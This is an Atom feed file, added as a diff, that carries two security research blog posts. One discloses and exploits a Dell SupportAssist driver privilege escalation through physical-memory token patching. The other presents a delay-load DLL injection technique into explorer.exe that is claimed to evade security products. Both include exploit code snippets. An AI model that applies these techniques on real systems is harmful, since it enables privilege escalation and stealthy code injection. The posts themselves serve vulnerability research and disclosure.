@@ -1,0 +1,712 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: windows | ]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/windows/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2018-05-18T09:39:16-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
+    <link href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/"/>
+    <updated>2018-05-17T21:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation</id>
+    <content type="html"><![CDATA[<p>This post details a local privilege escalation (LPE) vulnerability I found
+in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
+the tool, and is pretty similar to bugs found by ReWolf in
+ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
+These bugs are pretty interesting because they can be used to bypass driver
+signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
+compatible with newer operating systems.</p>
+
+<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
+of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
+purpose is to troubleshoot issues and provide support capabilities both to the
+user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
+which I spent quite a bit of time reversing and may blog about at a later date.</p>
+
+<h2>Bug</h2>
+
+<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
+functionality eagerly. It actually exposes a lot of functionality, much like
+some of the previously mentioned drivers. It provides capabilities for reading
+and writing the model-specific register (MSR), resetting the 1394 bus, and
+reading/writing CMOS.</p>
+
+<p>The driver is first loaded when the SupportAssist tool is launched, and the
+filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
+this driver isn&rsquo;t actually even built by Dell, but rather another company,
+PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
+companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
+highly likely that this driver can be found in a variety of other products&hellip;</p>
+
+<p>Once the driver is loaded, it exposes a symlink to the device at
+<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
+on the system. This allows us to trigger one of the many IOCTLs exposed by the
+driver; approximately 30. I found a DLL used by the userland agent that served
+as an interface to the kernel driver and conveniently had symbol names
+available, allowing me to extract the following:</p>
+
+<p><code>
+// 0x222004 = driver activation ioctl
+// 0x222314 = IoDriver::writePortData
+// 0x22230c = IoDriver::writePortData
+// 0x222304 = IoDriver::writePortData
+// 0x222300 = IoDriver::readPortData
+// 0x222308 = IoDriver::readPortData
+// 0x222310 = IoDriver::readPortData
+// 0x222700 = EcDriver::readData
+// 0x222704 = EcDriver::writeData
+// 0x222080 = MemDriver::getPhysicalAddress
+// 0x222084 = MemDriver::readPhysicalMemory
+// 0x222088 = MemDriver::writePhysicalMemory
+// 0x222180 = Msr::readMsr
+// 0x222184 = Msr::writeMsr
+// 0x222104 = PciDriver::readConfigSpace
+// 0x222108 = PciDriver::writeConfigSpace
+// 0x222110 = PciDriver::?
+// 0x22210c = PciDriver::?
+// 0x222380 = Port1394::doesControllerExist
+// 0x222384 = Port1394::getControllerConfigRom
+// 0x22238c = Port1394::getGenerationCount
+// 0x222388 = Port1394::forceBusReset
+// 0x222680 = SmbusDriver::genericRead
+// 0x222318 = SystemDriver::readCmos8
+// 0x22231c = SystemDriver::writeCmos8
+// 0x222600 = SystemDriver::getDevicePdo
+// 0x222604 = SystemDriver::getIntelFreqClockCounts
+// 0x222608 = SystemDriver::getAcpiThermalZoneInfo
+</code></p>
+
+<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
+that these functions do exactly as expected: allow userland services to both
+read and write arbitrary physical addresses. There are a few quirks, however.</p>
+
+<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
+processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
+event trigger or whether the kernel developers truly believed this would
+inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
+simple ioctl with the proper code must be sent. Once received, the driver will
+process control codes for the lifetime of the system.</p>
+
+<p>To unlock the driver, we just execute the following:</p>
+
+<p>```
+BOOL bResult;
+DWORD dwRet;
+SIZE_T code = 0xA1B2C3D4, outBuf;</p>
+
+<p>bResult = DeviceIoControl(hDriver, 0x222004,</p>
+
+<pre><code>                      &amp;code, sizeof(SIZE_T), 
+                      &amp;outBuf, sizeof(SIZE_T), 
+                      &amp;dwRet, NULL);
+</code></pre>
+
+<p>```</p>
+
+<p>Once the driver receives this control code and validates the received code
+(0xA1B2C3D4), it sets a global flag and begins accepting all other control
+codes.</p>
+
+<h2>Exploitation</h2>
+
+<p>From here, we could exploit this the same way rewolf did [4]: read out physical
+memory looking for process pool tags, then traverse these until we identify our
+process as well as a SYSTEM process, then steal the token. However, PCD
+appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
+indeed return the physical address of a given virtual address (VA), we can simply
+find the physical of our VA and enable a couple token privileges[5] using the
+<code>writePhysicalMemory</code> ioctl.</p>
+
+<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>
+
+<p><code>
+v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
+v6 = v5;
+if ( !v5 )
+  return 0xC0000001i64;
+MmProbeAndLockPages(v5, 1, 0);
+**(_QWORD **)(v3 + 0x18) = v4 &amp; 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
+MmUnlockPages(v6);
+IoFreeMdl(v6);
+</code></p>
+
+<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
+passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
+resolve any kernel mode VAs, only usermode addresses.</p>
+
+<p>We can still read chunks of physical memory unabated, however, as the
+<code>readPhysicalMemory</code> function is quite simple:</p>
+
+<p><code>
+if ( !DoWrite )
+{
+  memmove(a1, a2, a3);
+  return 1;
+}
+</code></p>
+
+<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
+return to that. I decided to take a different approach than rewolf for a number
+of reasons with great results.</p>
+
+<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
+This would require finding the token in memory and writing a few bytes at a
+field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
+of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
+a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
+we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
+can obtain from userland using the GetTokenInformation API.</p>
+
+<p>In order to speed up the memory search, I only iterate over the addresses that
+match the token&rsquo;s virtual address byte index. Essentially, when you convert a
+virtual address to a physical address (PA) the byte index, or the lower 12 bits,
+do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
+Translating this to a physical address then:</p>
+
+<p>```
+kd> !pte  fffff8a001cc2060</p>
+
+<pre><code>                                       VA fffff8a001cc2060
+</code></pre>
+
+<p>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
+contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
+pfn 7ac84     &mdash;-DA&mdash;KWEV  pfn 30d4      &mdash;-DA&mdash;KWEV  pfn 73147     &mdash;-DA&mdash;KWEV  pfn 716fd     -G-DA&mdash;KW-V</p>
+
+<p>kd> ? 716fd * 0x1000 + 060
+Evaluate expression: 1903153248 = 00000000`716fd060
+```</p>
+
+<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
+converting VA to PA, check out this great Microsoft article[6]). Notice the
+lower 12 bits remain the same between VA/PA. The search loop then boiled down
+to the following code:</p>
+
+<p>```
+uStartAddr = uStartAddr + (VirtualAddress &amp; 0xfff);
+for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {</p>
+
+<pre><code>lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
+for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
+    if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
+
+        if (TokenId &lt;= 0x0)
+            FetchTokenId();
+
+        if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
+            hTokenAddr = uStartAddr;
+            break;
+        }
+    }
+}
+
+HeapFree(GetProcessHeap(), 0, lpMemBuf);
+
+if (hTokenAddr &gt; 0x0)
+    break;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Once we identify the PA of our token, we trigger two separate writes at offset
+0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
+sometimes requires a few runs to get right (due to mapping, which I was too
+lazy to work out), but is very stable.</p>
+
+<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>
+
+<h2>Timeline</h2>
+
+<p>04/05/18 &ndash; Vulnerability reported<br/>
+04/06/18 &ndash; Initial response from Dell<br/>
+04/10/18 &ndash; Status update from Dell<br/>
+04/18/18 &ndash; Status update from Dell<br/>
+05/16/18 &ndash; Patched version released (v2.2)</p>
+
+<h2>References</h2>
+
+<p>[0]
+<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
+</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630%0A">http://blog.rewolf.pl/blog/?p=1630
+</a>[2] <a href="https://www.exploit-db.com/exploits/39785/%0A">https://www.exploit-db.com/exploits/39785/
+</a>[3] <a href="http://www.pc-doctor.com/%0A">http://www.pc-doctor.com/
+</a>[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit%0A">https://github.com/rwfpl/rewolf-msi-exploit
+</a>[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
+</a>[6]
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
+    <link href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/"/>
+    <updated>2017-09-19T14:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll</id>
+    <content type="html"><![CDATA[<p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
+here I am, two years later.  Perhaps this post will provide the necessary
+motiviation to conduct more public research.  I do love it.</p>
+
+<p>This post details a novel remote code injection technique I discovered while
+playing around with delay loading DLLs.  It allows for the injection of
+arbitrary code into arbitrary remote, running processes, provided that they
+implement the abused functionality.  To make it abundantly clear, this is not
+an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>
+
+<p>Modern code injection techniques typically rely on a variation of two different
+win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
+great article[0] detailing ten various methods of process injection.  While not
+all of them allow for injection into remote processes, particularly those
+already running, it does detail the most common, public variations.  This
+strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
+and we don&rsquo;t require our code to already be in the process.  There are no calls
+to NtQueueApc or CreateRemoteThread, and no need for thread or process
+suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
+below.</p>
+
+<h2>Delay Load DLL</h2>
+
+<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
+Executables commonly load all necessary dynamically linked libraries at runtime
+and perform the IAT fix-ups then.  Delay loading, however, allows for
+these libraries to be lazy loaded at call time, supported by a pseudo IAT
+that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
+following, decades old figure below:</p>
+
+<p><img src="/images/posts/2017/delay.gif"></p>
+
+<p>This image comes from a great Microsoft article released in 1998 [1] that
+describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>
+
+<p>Portable executables contain a data directory named
+<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
+or using windbg.  The structure of this entry is described in delayhlp.cpp,
+included with the WinSDK:</p>
+
+<p>```
+struct InternalImgDelayDescr {</p>
+
+<pre><code>DWORD           grAttrs;        // attributes
+LPCSTR          szName;         // pointer to dll name
+HMODULE *       phmod;          // address of module handle
+PImgThunkData   pIAT;           // address of the IAT
+PCImgThunkData  pINT;           // address of the INT
+PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
+PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
+DWORD           dwTimeStamp;    // 0 if not bound,
+                                // O.W. date/time stamp of DLL bound to (Old BIND)
+};
+</code></pre>
+
+<p>```</p>
+
+<p>The table itself contains RVAs, not pointers.  We can find the delay directory
+offset by parsing the file header:</p>
+
+<p>```
+0:022> lm m explorer
+start    end        module name
+00690000 00969000   explorer   (pdb symbols)        <br/>
+0:022> !dh 00690000 -f</p>
+
+<p>File Type: EXECUTABLE IMAGE
+FILE HEADER VALUES</p>
+
+<p>[&hellip;]</p>
+
+<p>   68A80 [      40] address [size] of Load Configuration Directory</p>
+
+<pre><code>   0 [       0] address [size] of Bound Import Directory
+1000 [     D98] address [size] of Import Address Table Directory
+</code></pre>
+
+<p>   AC670 [     140] address [size] of Delay Import Directory</p>
+
+<pre><code>   0 [       0] address [size] of COR20 Header Directory
+   0 [       0] address [size] of Reserved Directory
+</code></pre>
+
+<p>```</p>
+
+<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>
+
+<p><code>
+0:022&gt; dd 00690000+ac670 l8
+0073c670  00000001 000ac7b0 000b24d8 000b1000
+0073c680  000ac8cc 00000000 00000000 00000000
+0:022&gt; da 00690000+000ac7b0
+0073c7b0  "WINMM.dll"
+</code></p>
+
+<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
+and will not be loaded into the process until the imported function is invoked.
+Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
+to locate the desired function and patching the table at runtime.</p>
+
+<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
+is specifically for the delay load functions, and is referenced from the delay
+descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
+at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
+for its pseudo IAT, and so on and so forth.</p>
+
+<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
+In my particular running instance, it has not been invoked, so the pseudo IAT
+has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>
+
+<p><code>
+0:022&gt; dps 00690000+000b1000 l2
+00741000  006dd0ac explorer!_imp_load__PlaySoundW
+00741004  00000000
+</code></p>
+
+<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
+entry is merely a springboard thunk within the Explorer process.  This takes
+us here:</p>
+
+<p><code>
+0:022&gt; u explorer!_imp_load__PlaySoundW
+explorer!_imp_load__PlaySoundW:
+006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
+006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
+explorer!_tailMerge_WINMM_dll:
+006dd0b3 51              push    ecx
+006dd0b4 52              push    edx
+006dd0b5 50              push    eax
+006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
+006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)
+</code></p>
+
+<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
+not per function.  The <code>__delayLoadHelper2</code> function is the magic that
+handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
+this function handles calling LoadLibrary/GetProcAddress and patching the
+pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
+delay links dnslib.  Here&rsquo;s the process of resolution of
+DnsAcquireContextHandle:</p>
+
+<p><code>
+0:000&gt; dps 00060000+0001839c l2
+0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
+000783a0  00000000
+0:000&gt; bp DelayTest!__delayLoadHelper2
+0:000&gt; g
+ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
+Breakpoint 0 hit
+[...]
+0:000&gt; dd esp+4 l1
+0024f9f4  00075ffc
+0:000&gt; dd 00075ffc l4
+00075ffc  00000001 00010fb0 000183c8 0001839c
+0:000&gt; da 00060000+00010fb0
+00070fb0  "DNSAPI.dll"
+0:000&gt; pt
+0:000&gt; dps 00060000+0001839c l2
+0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
+000783a0  00000000
+</code></p>
+
+<p>Now the pseudo IAT entry has been patched up and the correct function is
+invoked on subsequent calls.  This has the additional side effect of leaving
+the pseudo IAT as both executable and writable:</p>
+
+<p><code>
+0:011&gt; !vprot 00060000+0001839c
+BaseAddress:       00371000
+AllocationBase:    00060000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+</code></p>
+
+<p>At this point, the DLL has been loaded into the process and the pseudo IAT
+patched up.  In another additional twist, not all functions are resolved on
+load, only the one that is invoked.  This leaves certain entries in the
+pseudo IAT in a mixed state:</p>
+
+<p><code>
+00741044  00726afa explorer!_imp_load__UnInitProcessPriv
+00741048  7467f845 DUI70!InitThread
+0074104c  00726b0f explorer!_imp_load__UnInitThread
+00741050  74670728 DUI70!InitProcessPriv
+0:022&gt; lm m DUI70
+start    end        module name
+74630000 746e2000   DUI70      (pdb symbols)
+</code></p>
+
+<p>In the above, two of the four functions are resolved and the DUI70.dll library
+is loaded into the process.  In each entry of the delay load descriptor, the
+structure referenced above maintains an RVA to the HMODULE.  If the module
+isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
+already loaded, the delay helper function will check it&rsquo;s entry to determine if
+a handle to it can be used:</p>
+
+<p>```
+HMODULE hmod = *idd.phmod;</p>
+
+<pre><code>if (hmod == 0) {
+    if (__pfnDliNotifyHook2) {
+        hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &amp;dli)));
+        }
+    if (hmod == 0) {
+        hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
+        }
+</code></pre>
+
+<p>```</p>
+
+<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
+above and passed into the <code>__delayLoadHelper2</code> function from the linker
+tailMerge stub.  So if the module is already loaded, as referenced from delay
+entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
+irregardless of this value; this can be used to our advantage.</p>
+
+<p>Another note here is that the delay loader supports notification hooks.  There
+are six states we can hook into: processing start, pre load library, fail
+load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
+can see how the hooks are used in the above code sample.</p>
+
+<p>Finally, in addition to delay loading, the portable executable also supports
+delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
+won&rsquo;t be touching on it here.</p>
+
+<h2>Limitations</h2>
+
+<p>Before detailing how we might abuse this (though it should be fairly obvious),
+it&rsquo;s important to note the limitations of this technique.  It is not completely
+portable, and using pure delay load functionality it cannot be made to be so.</p>
+
+<p>The glaring limitation is that the technique requires the remote process to be
+delay linked.  A brief crawl of some local processes on my host shows many
+Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
+applications are as well, including Chrome.  It is additionally a well
+supported function of the portable executable, and exists today on modern
+systems.</p>
+
+<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
+there must exist a DLL on disk.  There is no way to LoadLibrary from memory
+(unless you use one of the countless techniques to do that, but none of which
+use LoadLibrary&hellip;).</p>
+
+<p>In addition to implementing the delay load, the remote process must implement
+functionality that can be triggered.  Instead of doing a CreateRemoteThread,
+SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
+thus we must be able to trigger the remote process into performing this
+action/executing this function.  This is generally pretty easy if you&rsquo;re using
+the suspended process/new process strategy, but may not be trivial on running
+applications.</p>
+
+<p>Finally, any process that does not allow unsigned libraries to be loaded will
+block this technique.  This is controlled by ProcessSignaturePolicy and can be
+set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
+this at the moment, but Microsoft Edge was one of the first big products to be
+employing this policy.  This technique is also impacted by the
+ProcessImageLoadPolicy policy, which can be set to restrict loading of images
+from a UNC share.</p>
+
+<h2>Abuse</h2>
+
+<p>When discussing an ability to inject code into a process, there are three
+separate cases an attacker may consider, and some additional edge situations
+within remote processes.  Local process injection is simply the execution of
+shellcode/arbitrary code within the current process.  Suspended process is the
+act of spawning a new, suspended process from an existing, controlled one and
+injecting code into it.  This is a fairly common strategy to employ for
+migrating code, setting up backup connections, or establishing a known process
+state prior to injection.  The final case is the running remote process.</p>
+
+<p>The running remote process is an interesting case with several caveats that
+we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
+the same as a running process, but easier.  It&rsquo;s easier because many
+applications actually just load the delay library at runtime, either because
+the functionality is environmentally keyed and required then, or because
+another loaded DLL is linked against it and requires it.  Refer to the source
+code for the project for an implementation of suspended process injection [3].</p>
+
+<h3>Local Process</h3>
+
+<p>The local process is the most simple and arguably the most useless for this
+strategy.  If we can inject and execute code in this manner, we might as well
+link against the library we want to use.  It serves as a fine introduction to
+the topic, though.</p>
+
+<p>The first thing we need to do is delay link the executable against something.
+For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
+load DLLs via the linker options for Visual Studio.</p>
+
+<p>With that, we need to obtain the RVA for the delay directory.  This can be
+accomplished with the following function:</p>
+
+<p>```
+IMAGE_DELAYLOAD_DESCRIPTOR<em>
+findDelayEntry(char </em>cDllName)
+{</p>
+
+<pre><code>PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
+PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
+PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
+        pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
+DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
+IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;
+
+// iterate over entries 
+for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
+    char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
+    if (strcmp(_cDllName, cDllName) == 0){
+        pImgResult = entry;
+        break;
+    }
+}
+
+return pImgResult;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
+entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
+custom DLL name, and restore the protection mask:</p>
+
+<p><code>
+IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
+DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
+VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &amp;dwOldProtect);
+WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &amp;wroteBytes);
+VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &amp;dwOldProtect);
+</code></p>
+
+<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
+the delay helper function will snag the DllName from the table entry and load
+the DLL via LoadLibrary.</p>
+
+<h3>Remote Process</h3>
+
+<p>The most interesting of cases is the running remote process.  For demonstration
+here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
+running on a workstation under the current user.</p>
+
+<p>With an open handle to the explorer process, we must perform the same
+searching tasks as we did for the local process, but this time in a remote
+process.  This is a little more cumbersome, but the code can be found in the
+project repository for reference[3].  We simply grab the remote PEB, parse the
+image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
+targeting.</p>
+
+<p>This part is likely to prove the most unfriendly when attempting to port this
+to another process; what functionality are we targeting?  What function or
+delay load entry is generally unused, but triggerable from the current session?
+With explorer there are several options; it&rsquo;s delay linked against 9 different
+DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
+functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
+function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
+the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
+available and not fixed on workstations, and potentially unfixed on laptops,
+should the user never explicitly request the system to be ejected.</p>
+
+<p>When we request for the workstation to be ejected from the docking station, the
+function sends a PNP request.  We use the IShellDispatch object to execute
+this, which is accessed via Shell, handled by, you guessed it, explorer.</p>
+
+<p>The code for this is pretty simple:</p>
+
+<p>```
+HRESULT hResult = S_FALSE;
+IShellDispatch *pIShellDispatch = NULL;</p>
+
+<p>CoInitialize(NULL);</p>
+
+<p>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER,</p>
+
+<pre><code>                       IID_IShellDispatch, (void**)&amp;pIShellDispatch);
+</code></pre>
+
+<p>if (SUCCEEDED(hResult))
+{</p>
+
+<pre><code>pIShellDispatch-&gt;EjectPC();
+pIShellDispatch-&gt;Release();
+</code></pre>
+
+<p>}</p>
+
+<p>CoUninitialize();
+```</p>
+
+<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
+process; we can either pass on the request to the real DLL, or simply ignore
+it.  This leads us to stable and reliable remote code injection.</p>
+
+<h3>Remote Process &ndash; All Fixed</h3>
+
+<p>One interesting edge case is a remote process that you want to inject into via
+delay loading, but all imported functions have been resolved in the pseudo IAT.
+This is a little more complicated, but all hope is not lost.</p>
+
+<p>Remember when I mentioned earlier that a handle to the delay load library is
+maintained in its descriptor?  This is the value that the helper function
+checks for to determine if it should reload the module or not; if it&rsquo;s null, it
+attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
+by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
+once again loading that descriptor&rsquo;s DLL.</p>
+
+<p>In the discussed case, however, the pseudo IAT is all patched up; no more
+trampolines into the delay load helper function.  Helpfully the pseudo IAT is
+writable by default, so we can simply patch in the trampoline function
+ourselves and have it instantiate the descriptor all over again.  In short,
+this worst-case strategy requires three separate WriteProcessMemory calls: one
+to null out the module handle, one to overwrite the pseudo IAT entry, and one
+to overwrite the loaded DLL name.</p>
+
+<h3>Conclusions</h3>
+
+<p>I should make mention that I tested this strategy across several next gen
+AV/HIPS appliances, which will go unnamed here, and none where able to detect
+the cross process injection strategy.  It would seem overall to be an
+interesting challenge at detection; in remote processes, the strategy uses the
+following chain of calls:</p>
+
+<p>```
+OpenProcess(..);</p>
+
+<p>ReadRemoteProcess(..); // read image
+ReadRemoteProcess(..); // read delay table
+ReadRemoteProcess(..); // read delay entry 1&hellip;n</p>
+
+<p>VirtualProtectEx(..);
+WriteRemoteProcess(..);
+```</p>
+
+<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
+the loaded library would be loaded via supported and well-known Windows
+facilities.  I checked out a few other core Windows applications, and they all
+have pretty straightforward trigger strategies.</p>
+
+<p>The referenced project[3] includes both x86 and x64 support, and has been
+tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
+inject_local, inject_suspended, and inject_explorer.  It expects to find
+the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
+Note that it isn&rsquo;t production quality; beware, here be dragons.</p>
+
+<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>
+
+<h2>References</h2>
+
+<p>[0]
+<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
+[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
+[2]
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
+[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
+[4]
+<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
+]]></content>
+  </entry>
+  
+</feed>
